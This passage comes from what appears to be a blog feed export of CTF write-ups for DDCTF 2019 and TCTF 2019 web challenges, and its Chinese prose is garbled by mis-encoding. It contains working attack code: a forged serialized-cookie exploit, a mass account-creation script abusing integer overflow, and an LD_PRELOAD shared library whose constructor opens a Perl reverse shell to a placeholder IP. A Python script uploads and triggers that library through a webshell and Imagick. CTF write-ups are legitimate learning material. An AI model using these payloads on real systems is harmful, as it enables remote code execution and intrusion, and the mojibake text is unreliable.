class="line">$ddctf-&gt;index(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„çªç ´å£åœ¨å¯†é’¥ä¸Šï¼Œä¸€å¼€å§‹è®¤ä¸ºæ˜¯åˆ©ç”¨hashæ‰©å±•æ”»å‡»ï¼Œä½†æ˜¯ä¸å¯¹ï¼Œåæ¥ç»å‹äººæé†’æ‰å‘ç°å¿˜è®°äº†<code>sprintf</code>ï¼Œè¿™é‡Œæœ‰æ ¼å¼å­—ç¬¦ä¸²é—®é¢˜ã€‚ä¼ å…¥<code>%s</code>è®©æ ¼å¼å­—ç¬¦ä¸²ä¿æŒæ‹¥æœ‰<code>%s</code>ï¼Œå°±å¯ä»¥æ‹¿åˆ°å¯†é’¥äº†ã€‚ </p><img src="/2019/04/19/2019ddctf-my-solutions-writeup/1.jpg"><p><code>EzblrbNS</code>ï¼Œæ‹¿åˆ°ä¹‹åæˆ‘ä»¬å°±å¯ä»¥å¯¹æ•°æ®åšç­¾åï¼Œæ¥ç»•è¿‡hashéªŒè¯ã€‚æœ€åé€šè¿‡ååºåˆ—åŒ–è§¦å‘Applicationç±»çš„é­”æ³•å‡½æ•°ï¼Œå¯ä»¥è¯»å–æ–‡ä»¶ï¼Œpathæœ‰ä¸€ä¸ªé™åˆ¶é•¿åº¦å¿…é¡»ä¸º18ã€‚ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123; </span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">'..././config/flag.txt'</span>; </span><br><span class="line">&#125; </span><br><span class="line">$userdata = <span class="keyword">new</span> Application(); </span><br><span class="line">$cookiedata = serialize($userdata); </span><br><span class="line"><span class="keyword">echo</span> $cookiedata; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>; </span><br><span class="line">$key = <span class="string">'EzblrbNS'</span>; </span><br><span class="line">$hash = md5($key.$cookiedata); </span><br><span class="line"><span class="keyword">echo</span> urlencode($cookiedata.$hash); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè€ƒè™‘åˆ°<code>preg_replace</code>å¯ä»¥é‡‡ç”¨é€’å½’å†™æ³•ç»•è¿‡ï¼ŒåŒæ—¶ç»“åˆæºä»£ç åˆ†æï¼Œæˆ‘ä»¬å°±çŸ¥é“åªè¦ç»•è¿‡hashéªŒè¯å°±èƒ½éšæ„ååºåˆ—åŒ–ï¼Œä¸ºäº†è®©ä»£ç æ›´åŠ ç®€æ´ï¼Œæˆ‘ä»¬åªéœ€è¦ç”Ÿæˆ<code>Application</code>å¯¹è±¡ï¼Œå¹¶ä¸”è®©<code>path</code>ä¸ºflagè·¯å¾„å°±å¯ä»¥äº†ã€‚ </p><p>æœ€åä»£å…¥cookieï¼Œæäº¤è¯·æ±‚ï¼Œå¯ä»¥çœ‹åˆ°flagã€‚ </p><img src="/2019/04/19/2019ddctf-my-solutions-writeup/2.jpg"><h2 id="å¤§å‰å¤§åˆ©-ä»Šæ™šåƒé¸¡"><a href="#å¤§å‰å¤§åˆ©-ä»Šæ™šåƒé¸¡" class="headerlink" title="å¤§å‰å¤§åˆ©,ä»Šæ™šåƒé¸¡~"></a>å¤§å‰å¤§åˆ©,ä»Šæ™šåƒé¸¡~</h2><p>ç¬¬ä¸€æ­¥æ˜¯è¦é€šè¿‡æ•´æ•°æº¢å‡ºè®©ä»·æ ¼çš„å€¼å˜æˆ0ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥0å…ƒè´­ä¹°äº†ã€‚è¿™é‡Œå…¶å®å¦‚æœæ ¡éªŒçš„æ—¶å€™å°å¿ƒä¸€ç‚¹ï¼Œåº”è¯¥æ˜¯ä¸ä¼šå‡ºç°è¿™ç§æƒ…å†µçš„ã€‚ä½†æ˜¯æˆ‘åœ¨æµ‹è¯•çš„æ—¶å€™ä¹Ÿæ²¡æœ‰å®Œå…¨æµ‹è¯•å¥½ï¼Œæ•´æ•°æº¢å‡ºåæ˜¯ä¼šå˜æˆæœ€å°è´Ÿæ•°ï¼Œç„¶åå¼€å§‹ä¸æ–­å¢åŠ ã€‚æ‰€ä»¥è¿™é‡Œæœ€åçš„<code>value</code>ä¸º<code>4294967296</code>ã€‚ </p><p>ä¹‹åå°±æ˜¯æ³¨å†Œç”¨æˆ·ï¼Œä¹°ç¥¨ï¼Œæ‹¿åˆ°ticketå’Œidï¼Œåˆ é™¤ç”¨æˆ·ï¼Œè¿™é‡Œæ¯”è¾ƒå‘çš„æ˜¯è¦çœ‹åˆ é™¤ç”¨æˆ·çš„idï¼Œæ¯ä¸ªidéƒ½è¦åˆ ä¸€æ¬¡ï¼Œæ‰€ä»¥åˆ°æœ€åä¼šç‰¹åˆ«æ…¢ã€‚ã€‚ã€‚ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> json </span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line">my_header = &#123; </span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'user_name=whz1; REVEL_SESSION=785438359f65951fe7d8314e77e4f846'</span>, </span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'application/json'</span> </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_user_delete</span><span class="params">(username, password)</span>:</span> </span><br><span class="line">    register_url = <span class="string">'http://117.51.147.155:5050/ctf/api/register?name=&#123;&#125;&amp;password=&#123;&#125;'</span>.format(username, password) </span><br><span class="line">    buy_url = <span class="string">'http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296'</span> </span><br><span class="line">    r = requests.get(register_url) </span><br><span class="line">    re_result = re.match(<span class="string">r'user_name=(.*?); .*REVEL_SESSION=(.*?); .*'</span>, r.headers[<span class="string">'Set-Cookie'</span>]) </span><br><span class="line">    bot_headers = &#123; </span><br><span class="line">        <span class="string">'Cookie'</span>: <span class="string">'user_name=&#123;&#125;; REVEL_SESSION=&#123;&#125;'</span>.format(re_result.group(<span class="number">1</span>), re_result.group(<span class="number">2</span>)), </span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'application/json'</span> </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] buy chiji ticket .......'</span> </span><br><span class="line">    bill_info = requests.get(buy_url, headers=bot_headers) </span><br><span class="line">    bill_id = json.loads(bill_info.content)[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>] </span><br><span class="line">    pay_url = <span class="string">'http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&#123;&#125;'</span>.format(bill_id) </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] pay chiji ticket .......'</span> </span><br><span class="line">    time.sleep(<span class="number">1</span>) </span><br><span class="line">    ticket_info = requests.get(pay_url, headers=bot_headers) </span><br><span class="line">    bot_id = json.loads(ticket_info.content)[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_id'</span>] </span><br><span class="line">    bot_token = json.loads(ticket_info.content)[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_ticket'</span>] </span><br><span class="line">    delete_url = <span class="string">'http://117.51.147.155:5050/ctf/api/remove_robot?id=&#123;&#125;&amp;ticket=&#123;&#125;'</span>.format(bot_id, bot_token) </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] delete bot user ......'</span> </span><br><span class="line">    my_info = requests.get(delete_url, headers=my_header) </span><br><span class="line">    <span class="keyword">return</span> my_info.text </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">700</span>): </span><br><span class="line">    name = <span class="string">'ppzllac'</span> + str(n) </span><br><span class="line">    passwd = <span class="string">'12345678'</span> </span><br><span class="line">    <span class="keyword">print</span> create_user_delete(name, passwd)</span><br></pre></td></tr></table></figure><img src="/2019/04/19/2019ddctf-my-solutions-writeup/3.jpg"><h2 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload IMG"></a>Upload IMG</h2><p>ä¸€é“ä¸Šä¼ é¢˜ç›®ï¼Œä½†æ˜¯ä¸æ˜¯ä¼ ç»Ÿçš„ä¸Šä¼ ï¼Œæ²¡æœ‰æœåŠ¡å™¨è§£ææ¼æ´ï¼Œæ²¡æœ‰åç«¯éªŒè¯ç»•è¿‡ï¼Œè¿™é‡Œæ˜¯è¦æ±‚ä¸Šä¼ çš„å›¾ç‰‡ä¸­åŒ…å«<code>phpinfo</code>ã€‚ä¸€å¼€å§‹æˆ‘å®Œå…¨æ‡µé€¼ï¼Œç”¨çš„æ€è·¯æ˜¯ä¹‹å‰GoogleCTFçš„æ€è·¯ï¼Œå°†å­—ç¬¦ä¸²ç”¨PILåº“å¡«å……è¿›å»ï¼Œå‘ç°ä¸Šä¼ ä¹‹åè¿˜æ˜¯æç¤ºæ²¡æœ‰phpinfoã€‚ </p><p>ä¹‹ååœ¨å‹äººçš„æé†’ä¸‹ï¼Œçœ‹äº†<code>https://paper.seebug.org/387/</code>ï¼Œè¿˜æœ‰<code>https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg</code>ã€‚è¿™ä¸¤ç¯‡æ–‡ç« çŸ¥é“äº†ï¼Œè¿™é‡Œçš„è€ƒç‚¹æ˜¯GDæ¸²æŸ“ç»•è¿‡çš„é—®é¢˜ï¼Œå†åŠ ä¸Šæˆ‘ä»¬é‡æ–°ä¸‹è½½æ¸²æŸ“è¿‡çš„å›¾ç‰‡ä¹‹åå‘ç°å›¾ç‰‡é¦–éƒ¨ç”±GDçš„æ ‡å¿—ã€‚ </p><p>è¿™é‡Œä¸€å¼€å§‹æ˜¯ç›´æ¥ç”¨çš„seebugä¸­çš„è„šæœ¬ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°è„šæœ¬ç”Ÿæˆçš„å›¾ç‰‡å†æ¬¡æ¸²æŸ“ä¹‹åè¿˜æ˜¯ä¼šè®©<code>phpinfo()</code>ä¸­çš„å°¾éƒ¨å­—ç¬¦ä¸²è¢«è§£ææˆä¹±ç ã€‚ä¹‹åæƒ³åˆ°å…ˆä¸Šä¼ ä¸€æ¬¡æ–‡ä»¶ï¼Œå…ˆè®©GDæ¸²æŸ“ä¸€æ¬¡æŠŠæ¸²æŸ“çš„å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ï¼Œè¿™æ ·å†åˆ©ç”¨ä¸‹è½½çš„æ–‡ä»¶å°±è®©æ¸²æŸ“ä¿®æ”¹çš„åœ°æ–¹ä¸ä¼šæœ‰å¾ˆå¤šï¼Œæœ€åæ˜¯ä¸€æ¬¡å°±æˆåŠŸäº†ã€‚ </p><img src="/2019/04/19/2019ddctf-my-solutions-writeup/4.jpg"><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>ä»æµé‡æ•°æ®åŒ…ä¸­èƒ½å¤Ÿå‘ç°ä¸‰å¼ å›¾ç‰‡ï¼Œå…¶ä¸­æœ‰ä¸¤å¼ æ˜¯å¯ä»¥ä»ç½‘ä¸Šç›´æ¥ä¸‹è½½å¾—åˆ°çš„ã€‚è¿˜æœ‰ä¸€å¼ æ˜¯åªèƒ½ä»æ•°æ®åŒ…ä¸­æå–å¾—åˆ°ã€‚ä»ä¸­æ‹¿åˆ°ä¹‹åä¸€å¼€å§‹æ˜¯æ— æ³•æ˜¾ç¤ºçš„æŸåpngå›¾åƒï¼Œéœ€è¦ä¿®å¤pngçš„å›¾ç‰‡å¤´éƒ¨å’Œå°¾éƒ¨æ‰èƒ½æ­£å¸¸ä½¿ç”¨ã€‚ </p><p>ç„¶åå°±æ˜¯å¸¸è§çš„å¥—è·¯äº†ï¼Œä¿®æ”¹å›¾ç‰‡çš„é•¿åº¦é«˜åº¦ï¼Œè¿™é‡Œæ˜¯å¾—åˆ°äº†ä¸€ä¸²keyï¼Œå†ç»“åˆæµé‡åŒ…ä¸­çš„è§£å¯†ç½‘å€å°±å¯ä»¥å¯¹å›¾ç‰‡å®Œæˆè§£å¯†ï¼Œæ‹¿åˆ°åŠ å¯†çš„æ•°æ®ã€‚ </p><p>è§£å¯†ç½‘å€ <a href="http://tools.jb51.net//aideddesign/img_add_info" target="_blank" rel="noopener">http://tools.jb51.net//aideddesign/img_add_info</a> </p><p>åŠ å¯†æ•°æ®<code>flag+AHs-44444354467B5145576F6B63704865556F32574F6642494E37706F6749577346303469526A747D+AH0-</code> </p><p>è¿™æ˜¯ä¸€ä¸ªbase64+hexæ•°æ®ï¼Œhexè§£å¯†ä¹‹åå°±æ˜¯flagäº†ã€‚ </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æˆ‘å¾—è¯´DDCTFçœŸçš„æ˜¯è„‘æ´å¤ªå¤§ï¼Œä¸€è¨€éš¾å°½ã€‚ã€‚ã€‚ &lt;/p&gt;
&lt;h2 id=&quot;æ»´&quot;&gt;&lt;a href=&quot;#æ»´&quot; class=&quot;headerlink&quot; title=&quot;æ»´~&quot;&gt;&lt;/a&gt;æ»´~&lt;/h2&gt;&lt;p&gt;æ–‡ä»¶åŒ…å«ï¼Œéœ€è¦ä¸€äº›è½¬æ¢ã€‚è½¬æˆhexå€¼ä¹‹åä¸¤æ¬¡base64ã€‚ &lt;/p&gt;
&lt;figu
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2019TCTF web writeup</title>
    <link href="https://hurricane618.me/2019/03/31/2019TCTF-web-writeup/"/>
    <id>https://hurricane618.me/2019/03/31/2019TCTF-web-writeup/</id>
    <published>2019-03-31T14:15:47.000Z</published>
    <updated>2019-03-31T14:20:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="wallbreaker-easy"><a href="#wallbreaker-easy" class="headerlink" title="wallbreaker easy"></a>wallbreaker easy</h2><p>è¿™é“é¢˜åœ¨æ¯”èµ›çš„æ—¶å€™ä¸“æ³¨åœ¨imagickä¸Šé¢ï¼Œä½†æ˜¯ç”±äºæ˜¯æœ€æ–°ç‰ˆæœ¬ï¼Œä»¥å‰çš„bypassæ¼æ´å·²ç»ä¿®è¡¥ã€‚ã€‚ã€‚ä¹‹åç”±äºå¤è¯•çš„åŸå› æ²¡æœ‰ä»”ç»†ç ”ç©¶ï¼Œç°åœ¨å¼€å§‹å¤ç°ã€‚</p><p>è¿™é“é¢˜ç»™äº†ä¸€ä¸ªwebshellï¼Œå¯†ç æ˜¯backdoorï¼Œå¯ä»¥ç›´æ¥ç”¨èœåˆ€è¿æ¥ï¼Œç„¶è€Œç”¨phpinfoæŸ¥çœ‹ç¦ç”¨å‡½æ•°ï¼Œå‘ç°å·²ç»æŠŠæ‰€æœ‰æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°éƒ½banäº†ï¼Œå¹¶ä¸”çŸ¥é“æ“ä½œç³»ç»Ÿæ˜¯ubuntu18.04.</p><img src="/2019/03/31/2019TCTF-web-writeup/1.png"><p>æ‰€ä»¥è¿™æ˜¯ä¸€ä¸ªå—é™åˆ¶çš„webshellç»•è¿‡<code>disable_function</code>çš„é—®é¢˜</p><h3 id="bypass-disable-functionçš„æ–¹æ³•"><a href="#bypass-disable-functionçš„æ–¹æ³•" class="headerlink" title="bypass disable_functionçš„æ–¹æ³•"></a>bypass disable_functionçš„æ–¹æ³•</h3><p>ç»•è¿‡<code>disable_function</code>ä¹Ÿæ˜¯ä¸€ä¸ªè€ç”Ÿå¸¸è°ˆçš„é—®é¢˜äº†ã€‚æ€»ç»“ä¸€ä¸‹å¤§æ¦‚æœ‰ä¸€ä¸‹å››ç§ï¼š</p><ol><li>æ”»å‡»åç«¯ç»„ä»¶ï¼Œå¯»æ‰¾å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„ã€web åº”ç”¨å¸¸ç”¨çš„åç«¯ç»„ä»¶ï¼Œå¦‚ï¼ŒImageMagick çš„é­”å›¾æ¼æ´ã€bash çš„ç ´å£³æ¼æ´</li><li>å¯»æ‰¾æœªç¦ç”¨çš„æ¼ç½‘å‡½æ•°ï¼Œå¸¸è§çš„æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰ <code>system()</code>ã€<code>exec()</code>ã€<code>shell_exec()</code>ã€<code>passthru()</code>ï¼Œååƒ»çš„ <code>popen()</code>ã€<code>proc_open()</code>ã€<code>pcntl_exec()</code>ï¼Œé€ä¸€å°è¯•ï¼Œæˆ–è®¸æœ‰æ¼ç½‘ä¹‹é±¼</li><li>mod_cgi æ¨¡å¼ï¼Œå°è¯•ä¿®æ”¹ .htaccessï¼Œè°ƒæ•´è¯·æ±‚è®¿é—®è·¯ç”±ï¼Œç»•è¿‡ php.ini ä¸­çš„ä»»ä½•é™åˆ¶</li><li>åˆ©ç”¨ç¯å¢ƒå˜é‡ <code>LD_PRELOAD</code> åŠ«æŒç³»ç»Ÿå‡½æ•°ï¼Œè®©å¤–éƒ¨ç¨‹åºåŠ è½½æ¶æ„ *.soï¼Œè¾¾åˆ°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ•ˆæœ</li></ol><p>è¿™é‡Œç”±äºé¢˜ç›®çš„æç¤ºï¼Œæˆ‘ä»¬çŸ¥é“phpæ²¡æœ‰å¤šä½™çš„ç»„ä»¶ã€‚ä¹Ÿæ²¡æœ‰æ¼ç½‘ä¹‹é±¼ï¼ŒåŒæ—¶ä¹Ÿæ²¡æœ‰mod_cgiã€‚é‚£ä¹ˆå‰©ä¸‹çš„å°±æ˜¯<code>LD_PRELOAD</code>åŠ«æŒå‡½æ•°çš„æ–¹æ³•äº†ã€‚</p><p>è¿™ä¸ªä¸€ä¸ªåŠ¨æ€é“¾æ¥çš„ç¯å¢ƒå˜é‡ï¼Œåœ¨æˆ‘ä»¬æ‰§è¡Œç¨‹åºçš„æ—¶å€™ä¼šä¼˜å…ˆåŠ è½½è¿™ä¸ªå˜é‡ä¸­çš„åŠ¨æ€å‡½æ•°åº“ï¼Œå¦‚æœè¿™ä¸ªé‡Œé¢æœ‰ç¨‹åºç”¨åˆ°çš„åº“å‡½æ•°å°±ä¼šè°ƒç”¨ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥åŠ«æŒåº“å‡½æ•°æ‰§è¡Œæ¶æ„æ“ä½œã€‚</p><h3 id="åŠ«æŒåº“å‡½æ•°"><a href="#åŠ«æŒåº“å‡½æ•°" class="headerlink" title="åŠ«æŒåº“å‡½æ•°"></a>åŠ«æŒåº“å‡½æ•°</h3><p>è¿™é‡Œç”±äºè¦å…ˆè®¾ç½®ç¯å¢ƒå˜é‡ï¼Œé‚£ä¹ˆè§¦å‘çš„å‡½æ•°å¿…é¡»è¦èƒ½å¯ç”¨å¤–éƒ¨ç¨‹åºæ‰è¡Œï¼Œè¿™æ ·æ‰ä¼šæœ‰è°ƒç”¨åŠ¨æ€åº“çš„æƒ…å†µã€‚æ¯”å¦‚phpä¸­çš„<code>mail()</code></p><img src="/2019/03/31/2019TCTF-web-writeup/2.png"><p>å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†å¤–éƒ¨ç¨‹åº<code>sendmail</code>ï¼Œè¿™é‡Œçš„ç»å…¸æ–¹æ³•æ˜¯åŠ«æŒ<code>getuid()</code>ï¼Œå› ä¸º<code>sendmail</code>ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯è¿™é‡Œä¼šå‡ºç°ä¸€äº›é—®é¢˜ï¼Œå¦‚æœæ²¡æœ‰<code>sendmail</code>æˆ–è€…ç¦ç”¨äº†ï¼Œè¿™å°±ä¸ä¼šæœ‰å¤–éƒ¨ç¨‹åºè¿è¡Œï¼Œå½“ç„¶æˆ‘ä»¬åŠ«æŒçš„å‡½æ•°ä¹Ÿæ— æ³•æ‰§è¡Œã€‚</p><p>è¿™é‡Œæœ‰ä¸€ç§æ›´è¿›ä¸€æ­¥çš„åˆ©ç”¨æ–¹æ³•ï¼Œå°±æ˜¯ä½¿ç”¨<code>__attribute__ ((__constructor__))</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt; </span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>); </span><br><span class="line">    system(<span class="string">"ls"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¸œè¥¿ä¼šåœ¨å…±äº«åº“è£…è½½çš„æ—¶å€™è§¦å‘æ‰§è¡Œï¼Œè¿™æ ·ä¸€æ¥åªè¦æœ‰é¢å¤–çš„å¤–éƒ¨ç¨‹åºæ‰§è¡Œå°±å¯ä»¥åˆ©ç”¨ã€‚æˆ‘ä»¬å°±å¾—åˆ°ä¸€ç§æ›´é€šç”¨çš„åŠ«æŒæ‰§è¡Œçš„æ–¹æ³•ã€‚</p><h3 id="è§£å†³å¤–éƒ¨ç¨‹åºè°ƒç”¨"><a href="#è§£å†³å¤–éƒ¨ç¨‹åºè°ƒç”¨" class="headerlink" title="è§£å†³å¤–éƒ¨ç¨‹åºè°ƒç”¨"></a>è§£å†³å¤–éƒ¨ç¨‹åºè°ƒç”¨</h3><p>å¯æƒœçš„æ˜¯é¢˜ç›®ç¦ç”¨äº†<code>mail</code>ï¼Œçœ‹æ¥åªèƒ½å¦è¾Ÿè¹Šå¾„äº†ã€‚ç»“åˆé¢˜ç›®ç»™çš„hintï¼Œçœ‹æ¥æ˜¯è¦ä½¿ç”¨<code>imagick</code>ä½œä¸ºçªç ´äº†ã€‚æŸ¥çœ‹php-imagickæºç </p><p><a href="https://github.com/ImageMagick/ImageMagick" target="_blank" rel="noopener">https://github.com/ImageMagick/ImageMagick</a></p><p>ä»è¿™ä¸ªç½‘ç«™ <a href="https://imagemagick.org/script/formats.php" target="_blank" rel="noopener">https://imagemagick.org/script/formats.php</a> ä¸­å¯ä»¥çœ‹åˆ°å„ç§æ ¼å¼çš„æ–‡ä»¶ä¼šè°ƒç”¨ä¸åŒçš„ç¨‹åºï¼Œæ‰€ä»¥æ„é€ ä¸€ä¸ªèƒ½å¤Ÿè°ƒç”¨é¢å¤–ç¨‹åºçš„ç›¸åº”çš„æ–‡ä»¶å³å¯ã€‚åŒæ—¶å¯ä»¥ä½¿ç”¨<code>strace -f php xxx.php 2&gt;&amp;1 | grep execve</code> æ¥éªŒè¯ç¨‹åºæœ‰å¤–éƒ¨è°ƒç”¨ã€‚</p><p>è¿™é‡Œé€‰æ‹©äº†è°ƒç”¨<code>ghostscript</code>çš„epsæ–‡ä»¶ã€‚æ³¨æ„ï¼šå¿…é¡»è¦æœ‰ç›¸å…³æ–‡ä»¶çš„æ–‡ä»¶å¤´æ‰è¡Œã€‚è¿™é‡Œæ‰“ç®—é€šè¿‡åå¼¹shellæ¥æ‰§è¡Œreadflagçš„æ“ä½œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __attribute__((__constructor__)) init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line"> system(<span class="string">"perl -e 'use Socket;$i=\"your_IP\";$p=your_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;'"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†å…¶ç¼–è¯‘æˆå…±äº«åº“ <code>gcc -shared -fPIC evil.c -o evil.so</code>ï¼Œå¦‚æœæ˜¯è¦ç¼–è¯‘æˆ32ä½çš„åŠ ä¸Š<code>-m32</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">token = <span class="string">"/tmp/f28c9b5f67a7b7651a9d2b0021affc4e/"</span></span><br><span class="line">host = <span class="string">"http://111.186.63.208:31340"</span></span><br><span class="line">base = <span class="string">"your_vps"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_backdoor</span><span class="params">(payload)</span>:</span></span><br><span class="line">        res = requests.post(host, data=&#123;<span class="string">"backdoor"</span>:payload&#125;)</span><br><span class="line">        <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">        tp = token + filename</span><br><span class="line">        rp = base + filename</span><br><span class="line">        p = <span class="string">'echo file_put_contents("'</span> + tp + <span class="string">'", file_get_contents("'</span> + rp + <span class="string">'"));'</span></span><br><span class="line">        <span class="keyword">return</span> send_backdoor(p)</span><br><span class="line"></span><br><span class="line">print(up_file(<span class="string">"evil.so"</span>))</span><br><span class="line">print(up_file(<span class="string">"bypass.eps"</span>))</span><br><span class="line"></span><br><span class="line">print(send_backdoor(<span class="string">"putenv('LD_PRELOAD="</span> + token + <span class="string">"evil.so"</span> + <span class="string">"');"</span> + <span class="string">"$img = new Imagick('"</span> + token + <span class="string">"bypass.eps"</span> + <span class="string">"');"</span>))</span><br></pre></td></tr></table></figure><p>åœ¨vpsä¸Šç›‘å¬ï¼Œéšåæ‰§è¡Œè„šæœ¬ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šä¼ æˆåŠŸçš„è¯é‡Œé¢ä¼šæœ‰ä¸Šä¼ æ–‡ä»¶çš„å¤§å°æ··åœ¨ç½‘é¡µhtmlä¸­ã€‚</p><img src="/2019/03/31/2019TCTF-web-writeup/3.png"><p>æœ€ååœ¨æ ¹ç›®å½•ä¸‹æ‹¿åˆ°flagã€‚</p><h3 id="é¢˜ç›®ä¹‹å¤–"><a href="#é¢˜ç›®ä¹‹å¤–" class="headerlink" title="é¢˜ç›®ä¹‹å¤–"></a>é¢˜ç›®ä¹‹å¤–</h3><p>å…¶å®æˆ‘ä»¬å¯ä»¥èµ°çš„æ›´è¿œï¼Œè¿™é‡Œåªæ˜¯åŠ«æŒäº†åº“å‡½æ•°æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ä»£ç 